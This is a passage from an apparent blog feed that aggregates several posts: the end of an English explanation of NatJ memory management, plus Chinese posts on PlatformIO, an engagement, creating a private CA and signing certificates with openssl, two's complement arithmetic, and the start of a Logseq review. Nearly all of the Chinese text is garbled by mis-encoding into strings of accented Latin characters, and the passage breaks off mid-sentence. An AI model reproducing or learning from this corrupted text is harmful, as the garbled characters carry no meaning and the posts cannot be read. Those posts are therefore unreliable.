<p>However this violates restriction 2 as the corresponding Java object has not been freed by GC yet. NatJ does a clever trick: when the OC object is created, NatJ <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCImplementations.mm#L112" target="_blank" rel="noreferrer noopener">immediately calls <code>retain</code> on it</a>, then use this object normally. Now whenever the reference count reaches 1 instead of 0, we know this object is not held by anything, other than the initial <code>retain</code> by NatJ. And when the Java object is finalized, NatJ will call the final <code>release</code> on that to free it.</p>



<p>The problem now is: how to stop the Java object been freed by GC when the reference count is greater than 1, and how to allow it when the reference count reaches 1. The answer is simple: when the reference count <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCImplementations.mm#L167-L170" target="_blank" rel="noreferrer noopener">is greater than 1</a>, the corresponding Java object will be <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCImplementations.mm#L167-L170" target="_blank" rel="noreferrer noopener">stored in a global static map</a> (the <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/general/NatJ.java#L555" target="_blank" rel="noreferrer noopener">strong reference map</a>), so it will never be released by GC; when the reference count <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCImplementations.mm#L204-L208" target="_blank" rel="noreferrer noopener">reaches 1</a>, the Java object is <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCInstanceContainer.mm#L335-L337" target="_blank" rel="noreferrer noopener">removed from that map</a> (and added into another map with WeakReference, the <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/general/NatJ.java#L604-L605" target="_blank" rel="noreferrer noopener">weak reference map</a>), thus allows GC to do its work.</p>



<p></p>
<p><a rel="nofollow" href="https://www.noisyfox.io/natj-memory-management.html">A Brief Explanation of Memory Management in NatJ</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/post/2021-ciscn/</id>
        <title><![CDATA[CISCN 2021]]></title>
        <updated>2021-05-16T07:57:01+08:00</updated>
        <link href="http://blog.qrzbing.cn/post/2021-ciscn/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/post/2021-ciscn/"><![CDATA[<p>æ‘¸äº†ä¸€å°ä¼šé±¼ã€‚</p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/04/16/A-little-pitty-for-PlatformIO/</id>
        <title><![CDATA[å¯¹ PlatformIO æœ‰ç‚¹å¤±æœ›]]></title>
        <updated>2021-05-15T07:00:31+08:00</updated>
        <link href="https://blog.vvzero.com/2021/04/16/A-little-pitty-for-PlatformIO/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/04/16/A-little-pitty-for-PlatformIO/"><![CDATA[<blockquote><p>æœ¬æ–‡è®¨è®ºåœ°å€ <a href="https://bbs.blog.vvzero.com/d/10-dis-platformio">https://bbs.blog.vvzero.com/d/10-dis-platformio</a></p></blockquote><blockquote><p>PlatformIO ç›®å‰åªæ˜¯ç©å…·ï¼Œå•ç‰‡æœºå¼€å‘è¿˜å¾—ç”¨ Keil</p></blockquote><p>å¥½ä¹…ä¸ç¢°å•ç‰‡æœºï¼Œç°åœ¨æƒ³æä¸ªé¡¹ç›®ï¼Œé€‰å‹ STM32xxxxxxï¼Œæƒ³æ‰¾ä¸€å¥—â€œç°ä»£åŒ–â€çš„ IDEï¼Œäºæ˜¯æ‰¾åˆ°äº† PlatformIOã€‚</p><p>åˆšå¼€å§‹å¾ˆæ–°å¥‡å¾ˆæ¿€åŠ¨ï¼ŒVSCode å¼€å‘ç¯å¢ƒå¾ˆå‹å¥½ï¼Œå„ç§å•ç‰‡æœºå‹å·ã€åº“å¾ˆä¸°å¯Œï¼Œè€Œä¸” STM32 å¯ä»¥ç›´æ¥ç”¨ Arduino å¼€å‘ï¼Œå„ç§ä¸€é”®å¼éƒ¨ç½²ã€‚æœ€ä¸»è¦çš„æ˜¯å•†ç”¨å…è´¹ï¼Œå·®ç‚¹å°±é€‰ç”¨äº†ã€‚</p><p>ä½†æ˜¯é—®é¢˜å¾ˆå¿«å°±å‡ºç°äº†ï¼ŒArduino æ¡†æ¶å¯¹äºåº•å±‚çš„å°è£…å¤ªå®Œç¾ï¼Œæˆ‘ç”šè‡³ä¸èƒ½æ–¹ä¾¿åœ°ä¿®æ”¹ SPI æˆ–è€… I2C çš„å¼•è„šï¼Œè€Œä¸” GPIO è¯»å†™é€Ÿåº¦ä¹Ÿç›¸è¾ƒä½¿ç”¨ CMSIS æ…¢å¾ˆå¤šï¼ŒSTM32duino è™½ç„¶ä»ç„¶åœ¨å‘å±•ï¼Œä½†æ˜¯ï¼Œæˆ‘è®¤ä¸ºè¿˜å¤„åœ¨â€œç©å…·â€çš„é˜¶æ®µã€‚</p><p>å¦‚æœæŠ›å¼ƒ Arduino æ¡†æ¶ï¼Œå»ä½¿ç”¨ CMSIS ï¼Œé‚£ä¹Ÿå¤ªä¸æ–¹ä¾¿äº†ï¼Œè€Œä¸” STM32 æ ‡å‡†åº“åœ¨ PlatformIO é‡Œé¢ç›®å‰å±…ç„¶åªæ”¯æŒå¾ˆå°‘å‡ æ¬¾èŠ¯ç‰‡ï¼ˆF10x ç³»åˆ—å…¨ç³»ä¸æ”¯æŒï¼‰ã€‚å¦‚æœæˆ‘è¦ç”¨ FreeRTOSï¼ŒFreeRTOS å®˜æ–¹ç›®å‰ä¹Ÿæ²¡æœ‰é€‚é… PlatformIOã€‚</p><p>æœ€ç»ˆè¿˜æ˜¯å›åˆ° Keilï¼ŒèŠ±é’±çš„æ‰æ˜¯æœ€å¥½çš„ã€‚</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/02/14/we-are-engaged/</id>
        <title><![CDATA[æˆ‘ä»¬è®¢å©šäº† We are engaged!]]></title>
        <updated>2021-05-15T07:00:31+08:00</updated>
        <link href="https://blog.vvzero.com/2021/02/14/we-are-engaged/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/02/14/we-are-engaged/"><![CDATA[<blockquote><p>æœ¬æ–‡è®¨è®ºåœ°å€ <a href="https://bbs.blog.vvzero.com/d/2-blog">https://bbs.blog.vvzero.com/d/2-blog</a></p></blockquote><p>2021å¹´2æœˆ14æ—¥ï¼Œæƒ…äººèŠ‚ï¼Œå†œå†æ­£æœˆåˆä¸‰ï¼Œç²ç²ä¸ç‘¾ç‘¾å–œè®¢è‰¯ç¼˜ã€‚</p><p>äº’è”ç½‘æ˜¯æœ‰è®°å¿†çš„ï¼Œåœ¨æ­¤ï¼Œæˆ‘å°±ä»¥è®¡ç®—æœºä¸ºæ‹…ä¿ï¼Œä¾ç½‘ç»œè§è¯ï¼</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/</id>
        <title><![CDATA[å¦‚ä½•æˆä¸º CAï¼Œå¹¶ç­¾å‘è‡ªå·±çš„è¯ä¹¦]]></title>
        <updated>2021-05-15T07:00:31+08:00</updated>
        <link href="https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/"><![CDATA[<blockquote><p>æœ¬æ–‡è®¨è®ºåœ°å€ <a href="https://bbs.blog.vvzero.com/d/2-blog">https://bbs.blog.vvzero.com/d/2-blog</a></p></blockquote><blockquote><p>è¦è¯»æ‡‚æ­¤æ–‡ç« ï¼Œä½ éœ€è¦äº†è§£å¯¹ç§°åŠ å¯†ã€éå¯¹ç§°åŠ å¯†çš„åŸºæœ¬æ¦‚å¿µï¼Œå¹¶äº†è§£è¯ä¹¦ç­¾å‘çš„åŸºæœ¬æµç¨‹ã€‚</p></blockquote><h2 id="å·¥å…·å‡†å¤‡"><a href="#å·¥å…·å‡†å¤‡" class="headerlink" title="å·¥å…·å‡†å¤‡"></a>å·¥å…·å‡†å¤‡</h2><ol><li>ä¸€å° Linux ä¸»æœº</li><li>openssl</li></ol><h2 id="åˆ›å»º-CA-çš„ç§é’¥"><a href="#åˆ›å»º-CA-çš„ç§é’¥" class="headerlink" title="åˆ›å»º CA çš„ç§é’¥"></a>åˆ›å»º CA çš„ç§é’¥</h2><p>å¾ˆå®¹æ˜“ç†è§£ï¼ŒCA ä¹Ÿæœ‰è‡ªå·±çš„å…¬é’¥å’Œç§é’¥ã€‚</p><p><code>openssl genrsa -des3 -out CAPrivate.key 2048</code></p><p>è¿™ä¸ªå‘½ä»¤ä¼šç”Ÿæˆä¸€ä¸ªç§é’¥ <code>CAPrivate.key</code>ï¼Œå¹¶ä¸”å¿…é¡»è¦å¡«å†™ç§é’¥çš„å¯†ç ã€‚å¯ä»¥å°† 2048 æ”¹æˆ 4096ã€‚ä¸è¦å¥‡æ€ªè¿™é‡Œåªæœ‰ä¸€ä¸ªç§é’¥ï¼Œå…¶å®å…¬é’¥ä¹Ÿä¿å­˜åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œäº†ã€‚</p><h2 id="åˆ›å»ºæ ¹è¯ä¹¦"><a href="#åˆ›å»ºæ ¹è¯ä¹¦" class="headerlink" title="åˆ›å»ºæ ¹è¯ä¹¦"></a>åˆ›å»ºæ ¹è¯ä¹¦</h2><p><code>openssl req -x509 -new -nodes -key CAPrivate.key -sha256 -days 365 -out CAPrivate.pem</code></p><p>æ ¹è¯ä¹¦ï¼Œé¡¾åæ€ä¹‰ï¼Œè‚¯å®šæ˜¯è‡ªç­¾å‘çš„ã€‚è¿™ä¸ªè¯ä¹¦å¾…ä¼šéœ€è¦å®‰è£…åˆ°ä½ çš„ç»ˆç«¯è®¾å¤‡é‡Œé¢ï¼Œä¸ç„¶é è¿™ä¸ªæ ¹è¯ä¹¦ç­¾å‘çš„å…¶ä»–è¯ä¹¦ä¸ä¼šè¢«ä¿¡ä»»ã€‚</p><p>è¿™ä¸ªå‘½ä»¤é‡Œé¢éœ€è¦å¡«å†™å¾ˆå¤šä¿¡æ¯ï¼ŒæŒ‰ç…§å®é™…å¡«å†™å°±å¥½ã€‚</p><p>è‡³æ­¤ï¼Œä½œä¸ºä¸€ä¸ªç®€å•çš„ CAï¼Œæ‰€æœ‰çš„æ–‡ä»¶éƒ½å·²ç»é½å…¨äº†ã€‚</p><h2 id="åˆ›å»ºå¾…ç­¾å‘è¯ä¹¦çš„ç§é’¥"><a href="#åˆ›å»ºå¾…ç­¾å‘è¯ä¹¦çš„ç§é’¥" class="headerlink" title="åˆ›å»ºå¾…ç­¾å‘è¯ä¹¦çš„ç§é’¥"></a>åˆ›å»ºå¾…ç­¾å‘è¯ä¹¦çš„ç§é’¥</h2><p>è¿™ä¸ªç§é’¥ä¸ CA æ— å…³ï¼Œæ˜¯å¾…ç­¾å‘çš„ä¸‹ä¸€çº§è¯ä¹¦ã€‚è¿™ä¸€æ­¥å’Œä¸‹ä¸€æ­¥å¯ä»¥åœ¨å¦ä¸€å°æœºå™¨ä¸Šå®Œæˆï¼Œç„¶åæŠŠæ–‡ä»¶ä¼ ç»™ä¿å­˜ CA ä¿¡æ¯çš„æœºå™¨å°±å¥½ã€‚</p><p><code>openssl genrsa -out MyPrivate.key 2048</code></p><p>åŒæ ·ï¼Œå¯ä»¥æŠŠ 2048 æ”¹æˆ 4096ã€‚</p><h2 id="åˆ›å»º-CSR"><a href="#åˆ›å»º-CSR" class="headerlink" title="åˆ›å»º CSR"></a>åˆ›å»º CSR</h2><p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå¾…å‘é€ç»™ CAã€ä¸ºä½ ç­¾å‘è¯ä¹¦çš„ä¸€ä¸ªè¯·æ±‚ã€‚</p><p><code>openssl req -new -key MyPrivate.key -out MyRequest.csr</code></p><p>åŒæ ·ï¼Œè¿™é‡Œéœ€è¦å¡«å†™å¾ˆå¤šä¿¡æ¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ <code>Common Name</code> è¿™ä¸ªé¡¹ç›®ï¼Œå¦‚æœä½ çš„è¯ä¹¦æ˜¯ç»™ https ç”¨çš„ï¼Œè¿™é‡Œå°±å¡«ä½ çš„åŸŸåã€‚</p><h2 id="ä½¿ç”¨-CA-çš„ç§é’¥ç­¾å‘è¯ä¹¦"><a href="#ä½¿ç”¨-CA-çš„ç§é’¥ç­¾å‘è¯ä¹¦" class="headerlink" title="ä½¿ç”¨ CA çš„ç§é’¥ç­¾å‘è¯ä¹¦"></a>ä½¿ç”¨ CA çš„ç§é’¥ç­¾å‘è¯ä¹¦</h2><p><code>openssl x509 -req -in MyRequest.csr -CA CAPrivate.pem -CAkey CAPrivate.key -CAcreateserial -out X509Certificate.crt -days 365 -sha256</code></p><h2 id="è¯•ä¸€è¯•åˆšåˆšç­¾å‘çš„è¯ä¹¦"><a href="#è¯•ä¸€è¯•åˆšåˆšç­¾å‘çš„è¯ä¹¦" class="headerlink" title="è¯•ä¸€è¯•åˆšåˆšç­¾å‘çš„è¯ä¹¦"></a>è¯•ä¸€è¯•åˆšåˆšç­¾å‘çš„è¯ä¹¦</h2><ol><li>åœ¨å¾…æµ‹è¯•ç»ˆç«¯è®¾å¤‡ä¸Šå®‰è£… CA çš„æ ¹è¯ä¹¦ <code>CAPricate.pem</code>ï¼Œæ¯”å¦‚ Windowsã€Androidï¼ŒæŸäº›æµè§ˆå™¨å¿…é¡»å•ç‹¬å®‰è£…è¯ä¹¦ã€‚</li><li>æŠŠ <code>MyPrivate.key</code> å’Œ <code>X509Certificate.crt</code> ä½œä¸º HTTPS æœåŠ¡ï¼ˆæ¯”å¦‚ Nginxï¼‰çš„ç§é’¥å’Œè¯ä¹¦ï¼Œå†™å¥½é…ç½®æ–‡ä»¶ã€‚</li><li>åœ¨æµè§ˆå™¨é‡Œé¢è¯•è¯•çœ‹ï¼Œåº”è¯¥å¯ä»¥æ˜¾ç¤ºå°é”ï¼Œä¸”æ²¡æœ‰å®‰å…¨è­¦å‘Šã€‚</li></ol>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/</id>
        <title><![CDATA[æˆ‘ç»ˆäºçŸ¥é“äº†è¡¥ç çš„æ„ä¹‰]]></title>
        <updated>2021-05-15T07:00:31+08:00</updated>
        <link href="https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/"><![CDATA[<blockquote><p>æœ¬æ–‡è®¨è®ºåœ°å€ <a href="https://bbs.blog.vvzero.com/d/2-blog">https://bbs.blog.vvzero.com/d/2-blog</a></p></blockquote><blockquote><p>æœ¬æ–‡ä¾›åˆå­¦è€…å­¦ä¹ ï¼Œä¾›å¤§ä½¬æ‰¹åˆ¤ã€‚</p></blockquote><h2 id="è¡¥ç èƒŒæ™¯"><a href="#è¡¥ç èƒŒæ™¯" class="headerlink" title="è¡¥ç èƒŒæ™¯"></a>è¡¥ç èƒŒæ™¯</h2><p>å¾ˆä¹…å¾ˆä¹…ä»¥å‰ï¼Œå½“æˆ‘å‚åŠ  NOIPï¼ˆä¿¡æ¯å­¦å¥¥æ—åŒ¹å…‹ç«èµ›ï¼‰çš„æ—¶å€™ï¼Œè€å¸ˆæ˜¯è¿™ä¹ˆè®²è¡¥ç çš„ï¼š</p><blockquote><p>int å‹æ•°æ®çš„æœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œç¬¦å·ä½ä¸º 0 å°±ä»£è¡¨è¿™æ˜¯æ­£æ•°ï¼Œä¸º 1 å°±æ˜¯è´Ÿæ•°ã€‚ä½†æ˜¯ï¼Œ+0 å’Œ -0 ç†åº”æ˜¯åŒä¸€ä¸ªæ•°ï¼Œä½†åœ¨äºŒè¿›åˆ¶ä¸­å´è¡¨ç¤ºæˆäº†ä¸¤ä¸ªä¸åŒçš„æ•°ï¼ˆä»¥ 8 ä½ä¸ºä¾‹ï¼ŒäºŒè¿›åˆ¶è¡¨ç¤ºï¼‰ï¼š 00000000 å’Œ 10000000ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¼•å…¥äº†è¡¥ç ï¼Œè¡¥ç å°±æ˜¯ï¼Œå¯¹è´Ÿæ•°è€Œè¨€ï¼Œç¬¦å·ä½ä¸å˜ï¼Œå…¶ä»–ä½å–åï¼Œç„¶åå†åŠ  1ã€‚äºæ˜¯ï¼Œ -0 çš„è¡¥ç å°±æ˜¯ 10000000 -&gt; 11111111 -&gt; 00000000 ä¸ +0 ä¸€è‡´äº†ã€‚</p></blockquote><h2 id="è¡¥ç çš„æ„ä¹‰"><a href="#è¡¥ç çš„æ„ä¹‰" class="headerlink" title="è¡¥ç çš„æ„ä¹‰"></a>è¡¥ç çš„æ„ä¹‰</h2><p>å…¶å®å½“æ—¶æˆ‘å°±è¯¥æ„è¯†åˆ°ï¼Œä»…ä»…ä¸ºäº† 0 è¿™ä¸€ä¸ªæ•°ä¾¿åˆ›å»ºäº†â€œè¡¥ç â€è¿™ä¸ªæ¦‚å¿µï¼Œæœªå…å¤ªæµªè´¹äº†ã€‚æˆ‘æœ€è¿‘çœ‹äº† <em>CS: APP</em> è¿™æœ¬ä¹¦ï¼Œæ‰è¿›ä¸€æ­¥ç†è§£äº†è¡¥ç ã€‚</p><p>è¡¥ç ï¼Œå°±æ˜¯ä¸ºæœ‰ç¬¦å·æ•´æ•°è€Œåˆ›å»ºçš„æ¦‚å¿µã€‚å¯¹äºæ— ç¬¦å·æ•´æ•°ï¼Œæ˜¯ä¸å­˜åœ¨â€œè¡¥ç â€çš„æ¦‚å¿µçš„ã€‚æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªæ— ç¬¦å·æ•° 00100101ï¼Œå®ƒæ˜¯æ€ä¹ˆè½¬æ¢æˆåè¿›åˆ¶çš„ï¼ŸåŠ æƒæ±‚å’Œï¼Œ<code>0Ã—2^7+0Ã—2^6+1Ã—2^5+0Ã—2^4+0Ã—2^3+1Ã—2^2+0Ã—2^1+1Ã—2^0=37</code>ï¼›æ— ç¬¦å·æ•° 10000011ï¼Œ<code>1Ã—2^7+0Ã—2^6+0Ã—2^5+0Ã—2^4+0Ã—2^3+0Ã—2^2+1Ã—2^1+1Ã—2^0=131</code>ã€‚</p><p>å¯¹äºæœ‰ç¬¦å·æ•°å‘¢ï¼Ÿå‡å¦‚æˆ‘ä»¬ä¸ç”¨è¡¥ç ï¼Œé‚£ä¹ˆæœ‰ç¬¦å·æ•° 10000011ï¼Œå°±æ˜¯ <code>-(0Ã—2^6+0Ã—2^5+0Ã—2^4+0Ã—2^3+0Ã—2^2+1Ã—2^1+1Ã—2^0)=-3</code>ã€‚äººè¿™ä¹ˆç®—èµ·æ¥æ˜¯æŒºèˆ’æœï¼Œä½†æ˜¯è®¡ç®—æœºä¼šå¾ˆéš¾å—ï¼Œå‡­ä»€ä¹ˆæˆ‘æœ€é«˜ä½çš„æƒå€¼æ²¡äº†ï¼Ÿåªèƒ½åšç¬¦å·ï¼Ÿ</p><p>ç„¶åæˆ‘ä»¬è¯•è¯•è¡¥ç ã€‚10000011 çš„è¡¥ç æ˜¯ 11111101ï¼Œå¦‚ä½•ç”¨è¡¥ç æ±‚å®ƒçš„åè¿›åˆ¶å‘¢ï¼Ÿå…¶å®è¿™è·Ÿæ— ç¬¦å·æ•°æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ï¼Œæœ€é«˜ä½çš„æƒå€¼ï¼Œä¸æ˜¯ 2^7ï¼Œè€Œæ˜¯ -2^7ã€‚æ±‚å€¼ï¼š<code>1Ã—(-2^7)+1Ã—2^6+1Ã—2^5+1Ã—2^4+1Ã—2^3+1Ã—2^2+0Ã—2^1+1Ã—2^0=-3</code>ï¼Œæ˜¯ä¸æ˜¯å¾ˆç¥å¥‡ï¼Ÿ</p><p>å¯¹äºæ­£æ•°è€Œè¨€ï¼Œå°±æ›´ç®€å•äº†ï¼Œä¸æ— ç¬¦å·æ•°ä¸€è‡´ã€‚</p><h2 id="è¡¥ç å†æ¢"><a href="#è¡¥ç å†æ¢" class="headerlink" title="è¡¥ç å†æ¢"></a>è¡¥ç å†æ¢</h2><p>è®¡ç®—æœºåªèƒ½åšåŠ æ³•ï¼ˆä¸æ˜¯ï¼‰ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬çœ‹çœ‹ç”¨è¡¥ç åšåŠ æ³•ï¼Œæœ‰ä»€ä¹ˆå¥½å¤„ã€‚</p><p>å…ˆè®¡ç®— -13+10 å§ï¼Œå¾ˆç®€å•çš„äºŒè¿›åˆ¶ç«–å¼åŠ æ³•ï¼š</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>11111101 å³ä¸º -3 çš„è¡¥ç ã€‚</p><p>å†ç®—ä¸€ä¸ªï¼Œ-8+9ï¼š</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr></tbody></table><p>ç¥å¥‡å—ï¼Ÿæœ€é«˜ä½çš„ 0 ä¸è§äº†ï¼Œå˜æˆæ­£æ•° 1 äº†ã€‚</p><h2 id="è¡¥ç å°ç»“"><a href="#è¡¥ç å°ç»“" class="headerlink" title="è¡¥ç å°ç»“"></a>è¡¥ç å°ç»“</h2><p>è¡¥ç ï¼Œå°±æ˜¯è®¡ç®—æœºå†…éƒ¨æœ‰ç¬¦å·æ•°çš„å­˜å‚¨æ–¹å¼ï¼Œæˆ‘ä»¬ä¸è¦è®¤ä¸ºè¡¥ç æ˜¯ç”±åŸç â€œè½¬æ¢â€è€Œæ¥çš„ï¼Œè¡¥ç æœ¬æ¥å°±ä»£è¡¨äº†å®é™…çš„æ•°å­—ï¼Œ11111101 == -3ï¼Œå°±è¿™æ ·ã€‚</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/12/06/review-of-logseq/</id>
        <title><![CDATA[Logseqï¼šå¼€æºä¼˜é›…çš„çŸ¥è¯†ç®¡ç†å·¥å…·]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/12/06/review-of-logseq/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/12/06/review-of-logseq/"><![CDATA[<figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/altumcode-GVASc0_Aam0-unsplash.jpg" alt="é¢˜å›¾" /><figcaption>é¢˜å›¾</figcaption></figure><h1 id="å‰è¨€">å‰è¨€</h1><p>ç¬”è®°ï¼Œå¯¹äºæˆ‘ä¸ªäººæ¥è¯´ï¼Œæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ•´ç†ä¸å›é¡¾çŸ¥è¯†çš„å·¥å…·ã€‚æ‰¾åˆ°é€‚åˆè‡ªå·±çš„ç¬”è®°è½½ä½“ï¼Œå°†ä¼šæå¤§åœ°æé«˜çš„æ•ˆç‡ã€‚ä¸ºè¿½æ±‚æœ€ä½³æ•ˆç‡ï¼Œæˆ‘å°è¯•è¿‡å¤šç§æ–¹å¼ï¼Œä»æ‰‹å†™åˆ°ç”µå­ï¼Œä»æ–‡æ¡£åˆ°å¯¼å›¾ã€‚å®ƒä»¬å„å…·ç‰¹è‰²ï¼Œåˆéš¾å…ç¼ºå¤±æŸç§ç‰¹æ€§è€Œä½¿æˆ‘æœ€ç»ˆæ”¾å¼ƒã€‚</p><h2 id="å°è±¡ç¬”è®°">å°è±¡ç¬”è®°</h2><p>16å¹´ï¼Œæ–°ä¹°çš„ç¬”è®°æœ¬ç”µè„‘ä¸Šé¢„è£…äº†å°è±¡ç¬”è®°ã€‚å½“æ—¶çš„å°è±¡ç¬”è®°è¿˜ä»…æ”¯æŒå¯Œæ–‡æœ¬ç¼–è¾‘æ¨¡å¼ã€‚å¯Œæ–‡æœ¬ç¼–è¾‘æ„å‘³ç€æ‰€è§å³æ‰€å¾—ï¼Œæ ¼å¼å¯ä»¥è½»æ¾åœ°ç‚¹å‡»èœå•æŒ‰é’®éšæ—¶è°ƒæ•´ã€‚</p><p>ä½†æ˜¯å¯¹äºæˆ‘æ¥è¯´ï¼Œè¿™å°±æ„å‘³ç€æˆ‘å°†è¦è…¾å‡ºä¸€åªæ‰‹æ¡ä½é¼ æ ‡ï¼Œåœ¨éœ€è¦æ—¶è°ƒæ•´æ ¼å¼ã€‚è¿™å…¶å®ä¼šé™ä½ç¬”è®°çš„æ•ˆç‡ï¼Œå› ä¸ºè¿™ç§æ¨¡å¼ä¸‹ï¼Œä½ ä¸ä»…ä»…è¦å…³æ³¨ç¬”è®°çš„å†…å®¹ï¼Œè€Œä¸”éœ€æ—¶ä¸æ—¶åœ°åˆ†å¿ƒè°ƒæ•´æ ¼å¼ã€‚è¿™ä¸æˆ‘è¿½æ±‚é«˜æ•ˆçš„ç¬”è®°ä½“éªŒèƒŒé“è€Œé©°ã€‚</p><p>é™¤æ­¤ä»¥å¤–ï¼Œåœ¨å¯Œæ–‡æœ¬æ¨¡å¼ä¸‹ï¼Œå…¬å¼çš„è¾“å…¥éå¸¸ç¹çï¼Œè¿™ä¹Ÿæ˜¯æˆ‘æœ€ç»ˆæ”¾å¼ƒå°è±¡ç¬”è®°çš„åŸå› ä¹‹ä¸€ã€‚</p><p>è™½ç„¶ï¼Œå°è±¡ç¬”è®°åœ¨ 18 å¹´å¼€å§‹æ”¯æŒ Markdownï¼Œä½†å…¶ç¼–è¾‘ã€é¢„è§ˆåŒå±çš„è®¾è®¡ï¼Œå¯¹äºè¿½æ±‚ç®€æ´çš„æˆ‘å¤ªè¿‡å¤æ‚ï¼Œä¹Ÿå°±æ²¡æœ‰å†æ‹¾èµ·ã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/yinxiang-markdown.png" alt="å°è±¡ç¬”è®° Markdown åŒå±è®¾è®¡" /><figcaption>å°è±¡ç¬”è®° Markdown åŒå±è®¾è®¡</figcaption></figure><h2 id="typora">Typora</h2><p>18 å¹´å·¦å³ï¼Œç»æœ‹å‹æ¨èï¼Œäº†è§£åˆ° <a href="https://typora.io/" target="_blank" rel="noopener">Typora</a> è¿™æ¬¾ç®€æ´çš„ Markdown ç¼–è¾‘å™¨ï¼Œå¹¶ä¸€ç›´ä½¿ç”¨è‡³ä»Šã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/typora.png" alt="Typora:æ‰€è§å³æ‰€å¾—" /><figcaption>Typora:æ‰€è§å³æ‰€å¾—</figcaption></figure><p>Typora ä¸»è¦ä»¤æˆ‘å–œçˆ±çš„ä¸€ç‚¹æ˜¯å…¶â€œ<strong>æ‰€è§å³æ‰€å¾—</strong>â€çš„å³æ—¶ Markdown æ¸²æŸ“ã€‚è¯¥è½¯ä»¶åªç”¨ä¸€å±ï¼Œæ—¢æä¾›äº† Markdown çš„æ’ç‰ˆåŠŸèƒ½ï¼Œåˆå‡å»äº†ç¼–è¾‘æ¨¡å¼ä¸‹ Markdown ä¸­çš„å½±å“é˜…è¯»ä½“éªŒçš„æ ¼å¼ç¬¦å·ã€‚</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/fences.png" alt="Typora ä»£ç å—" /><figcaption>Typora ä»£ç å—</figcaption></figure><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/math.png" alt="Typora æ•°å­¦å…¬å¼" /><figcaption>Typora æ•°å­¦å…¬å¼</figcaption></figure><p>ç„¶è€Œï¼ŒTypora åªæ˜¯ä¸€ä¸ªç¼–è¾‘å™¨ï¼Œåªèƒ½è®°å½•ï¼Œ<strong>éš¾ä»¥æ£€ç´¢å’Œå›é¡¾</strong>ã€‚å› æ­¤ï¼Œä»…é  Typora ï¼Œéš¾ä»¥å®Œæˆç¬”è®°çš„å®Œæ•´é—­ç¯ã€‚ä¸€ç§å¸¸è§çš„å·¥ä½œæµå¯ä»¥å‹‰å¼ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå³ 